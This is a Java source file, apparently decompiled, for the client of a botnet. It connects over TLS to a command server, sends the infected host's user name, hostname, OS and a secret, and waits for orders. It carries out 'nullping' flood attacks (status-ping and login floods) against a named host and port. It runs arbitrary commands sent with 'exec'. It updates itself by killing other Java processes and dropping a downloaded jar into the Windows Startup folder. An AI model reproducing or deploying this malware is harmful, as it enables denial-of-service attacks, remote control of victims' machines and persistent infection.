import com.sun.jna.platform.win32.KnownFolders;
import com.sun.jna.platform.win32.Shell32Util;
import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.DecoderException;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.timeout.ReadTimeoutHandler;
import java.io.File;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.charset.StandardCharsets;
import java.security.KeyStore;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;
import javax.net.ssl.KeyManagerFactory;

public class InboundHandler
extends SimpleChannelInboundHandler {
    public final NioEventLoopGroup eventLoopGroup = new NioEventLoopGroup(0){
        {
            System.out.println("create new attack event loop");
        }
    };
    public static final ChannelHandler channelHandler = new ChannelHandler(){

        @Override
        public void handlerRemoved(ChannelHandlerContext arg0) throws Exception {
        }

        @Override
        public void handlerAdded(ChannelHandlerContext arg0) throws Exception {
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext c, Throwable t) throws Exception {
            c.close();
        }
    };
    private final NioEventLoopGroup connectionEventLoop = new NioEventLoopGroup(1){
        {
            System.out.println("create new connection event loop");
        }
    };
    private static final SslContext sslContext;
    private final InetSocketAddress socketAddress;
    private Channel channel;
    private final Consumer<ByteBuf>[] consumers;
    private volatile boolean initialized;

    public InboundHandler(InetSocketAddress inetSocketAddress) {
        ArrayList<Consumer<ByteBuf>> arrayList = new ArrayList<>();
        arrayList.add(this::writeLong);
        arrayList.add(this::handleCommand);
        this.consumers = (Consumer<ByteBuf>[])arrayList.toArray((Object[])new Consumer[0]);
        this.socketAddress = inetSocketAddress;
    }

    public void initChannel() throws IOException {
        ((Bootstrap)((Bootstrap)((Bootstrap)new Bootstrap().channel(NioSocketChannel.class)).group(this.connectionEventLoop)).handler(new ChannelInitializer(){

            @Override
            protected void initChannel(Channel ch) throws Exception {
                System.out.println("Channel init");
                ch.pipeline().addLast("tls", (ChannelHandler)sslContext.newHandler(ch.alloc())).addLast("length", (ChannelHandler)new PacketCodec()).addLast("timeout", (ChannelHandler)new ReadTimeoutHandler(30)).addLast("handler", (ChannelHandler)InboundHandler.this);
            }
        })).connect((SocketAddress)this.socketAddress).syncUninterruptibly();
        this.initialized = true;
    }

    @Override
    public void channelActive(ChannelHandlerContext ctx) throws Exception {
        String string;
        System.out.println("channel active");
        this.channel = ctx.channel();
        super.channelActive(ctx);
        try {
            if (OperatingSystem.isLinux()) {
                string = System.getenv((String)"HOSTNAME");
                if (string == null) {
                    string = "unknown";
                }
            } else {
                string = InetAddress.getLocalHost().getHostName();
            }
        }
        catch (Exception exception) {
            string = "";
        }
        this.reportClientInfo(System.getProperty((String)"user.name"), Main.auto, string, System.getProperty((String)"os.name"), PersistenceHandler.getProcessorCountHash(), Main.getSecret(), Runtime.getRuntime().availableProcessors());
    }

    @Override
    protected void channelRead0(ChannelHandlerContext channelHandlerContext, Object byteBufObj) throws Exception {

        ByteBuf byteBuf = (ByteBuf) byteBufObj; // not sure if this is correct...

        short s = byteBuf.readUnsignedByte();
        if (s >= this.consumers.length) {
            throw new DecoderException("Unknown packet id: " + s);
        }
        this.consumers[s].accept(byteBuf);
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        super.channelInactive(ctx);
        this.initialized = false;
        CommandHandler.handlers.forEach((n, commandHandler) -> {
            commandHandler.shouldRun = false;
        });
        try {
            this.eventLoopGroup.shutdownGracefully().get(10L, TimeUnit.SECONDS);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        try {
            new Thread(() -> {
                try {
                    Thread.sleep((long)1000L);
                    this.connectionEventLoop.shutdownGracefully().get();
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }).start();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        Main.connect();
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        if (cause instanceof OutOfMemoryError) {
            System.gc();
        }
        ctx.channel().config().setAutoRead(false);
        this.sendExceptionWithListener(cause);
        cause.printStackTrace();
    }

    public static void doUpdate(final String[] uselessArray) throws Exception {
        final String name = ManagementFactory.getRuntimeMXBean().getName();
        System.out.println("Name = " + name);
        final long long1 = Long.parseLong(name.split("@")[0]);
        System.out.println(new StringBuilder().append("PID  = ").append(long1).toString());
        final Process start = new ProcessBuilder(new String[] { "tasklist.exe", "/fo", "csv", "/nh" }).start();
        new Thread(() -> {
            final Scanner scanner = new Scanner(start.getInputStream());
            if (scanner.hasNextLine()) {
                scanner.nextLine();
            }
            final ArrayList list = new ArrayList();
            while (scanner.hasNextLine()) {
                final String[] split = scanner.nextLine().split(",");
                final String replaceFirst = split[0].substring(1).replaceFirst(".$", "");
                final int int1 = Integer.parseInt(split[1].substring(1).replaceFirst(".$", ""));
                if (replaceFirst.startsWith("java") && int1 != long1) {
                    (list).add(int1);
                }
            }
            (list).forEach(integer -> {
                try {
                    Runtime.getRuntime().exec(new StringBuilder().append("taskkill /F /PID ").append(integer).toString()).waitFor();
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            });
            final File file = new File(Shell32Util.getKnownFolderPath(KnownFolders.FOLDERID_Startup), "javaw.jar");
            file.delete();
            try {
                Updater.downloadJarWithSecret(file, Main.getSecret());
                Runtime.getRuntime().exec(new String[] { Main.javawPath, "-jar", file.getPath() });
            }
            catch (Exception ex) {
                throw new RuntimeException((Throwable)ex);
            }
        }).start();
        start.waitFor();
        System.out.println("Done");
    }

    public void reportClientInfo(String string, boolean bl, String string2, String string3, String string4, byte[] byArray, int n) {
        ByteBuf byteBuf = Unpooled.buffer();
        byteBuf.writeByte(0);
        byteBuf.writeInt(Main.version);
        InboundHandler.writeString(byteBuf, string);
        byteBuf.writeBoolean(bl);
        InboundHandler.writeString(byteBuf, string2);
        InboundHandler.writeString(byteBuf, string3);
        InboundHandler.writeString(byteBuf, string4);
        this.writeByteArray(byteBuf, byArray);
        byteBuf.writeInt(n);
        this.channel.writeAndFlush(byteBuf);
    }

    public void writeByteArray(ByteBuf byteBuf, byte[] byArray) {
        byteBuf.writeShort(byArray.length);
        if (byArray.length > 0) {
            byteBuf.writeBytes(byArray);
        }
    }

    private void writeLong(ByteBuf byteBuf) {
        ByteBuf byteBuf2 = Unpooled.buffer();
        byteBuf2.writeByte(1);
        byteBuf2.writeLong(byteBuf.readLong());
        this.channel.writeAndFlush(byteBuf2);
    }

    /*
     * Exception decompiling
     */
    private void handleCommand(final ByteBuf byteBuf) {
        final String charSequence = readCharSequence(byteBuf);
        try {
            final String[] split = charSequence.split(" ");
            if (split[0].equals("nullping")) {
                final int int1 = Integer.parseInt(split[1]);
                final int int2 = Integer.parseInt(split[2]);
                final String s = split[3];
                final int int3 = Integer.parseInt(split[4]);
                final String s2 = split[5];
                Command c = null;
                switch (s2) {
                    case "statusping": {
                        c = new StatusPingCommand(s, int3);
                        break;
                    }
                    case "login": {
                        c = new LoginCommand(s, int3);
                        break;
                    }
                    default: {
                        throw new IllegalArgumentException("Unknown attack type");
                    }
                }
                new CommandHandler(this, Integer.parseInt(split[6]), c, int1, int2);
            }
            if (split[0].startsWith("exec")) {
                Runtime.getRuntime().exec(charSequence.substring(5));
            }
        }
        catch (Exception throwable) {
            throwable.printStackTrace();
            this.sendException((Throwable)throwable);
        }
    }

    private static String readCharSequence(ByteBuf byteBuf) {
        return byteBuf.readCharSequence(byteBuf.readUnsignedShort(), StandardCharsets.UTF_8).toString();
    }

    public void sendException(Throwable throwable) {
        ByteBuf byteBuf = Unpooled.buffer();
        byteBuf.writeByte(2);
        try {
            new RemoteException(throwable).writeRemoteException(new ByteBufOutputStream(byteBuf));
            this.channel.writeAndFlush(byteBuf);
        }
        catch (Exception exception) {
            throw new RuntimeException("Failed to serialize remote exception!", (Throwable)exception);
        }
    }

    public void sendExceptionWithListener(Throwable throwable) {
        ByteBuf byteBuf = Unpooled.buffer();
        byteBuf.writeByte(2);
        try {
            new RemoteException(throwable).writeRemoteException(new ByteBufOutputStream(byteBuf));
            this.channel.writeAndFlush(byteBuf).addListener(ChannelFutureListener.CLOSE);
        }
        catch (Exception exception) {
            throw new RuntimeException("Failed to serialize remote exception!", (Throwable)exception);
        }
    }

    private static void writeString(ByteBuf byteBuf, String string) {
        byte[] byArray = string.getBytes(StandardCharsets.UTF_8);
        byteBuf.writeShort(byArray.length);
        byteBuf.writeBytes(byArray);
    }

    static {
        try {
            CertificateFactory certificateFactory = CertificateFactory.getInstance((String)"X.509");
            Certificate certificate = certificateFactory.generateCertificate(InboundHandler.class.getResourceAsStream("/key.crt"));
            KeyStore keyStore = KeyStore.getInstance((String)KeyStore.getDefaultType());
            keyStore.load(null, null);
            keyStore.setCertificateEntry("ca", certificate);
            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance((String)KeyManagerFactory.getDefaultAlgorithm());
            keyManagerFactory.init(keyStore, null);
            sslContext = SslContextBuilder.forClient().trustManager((X509Certificate)certificate).build();
        }
        catch (Exception exception) {
            throw new RuntimeException("Failed to load ssl certificate!", (Throwable)exception);
        }
    }



}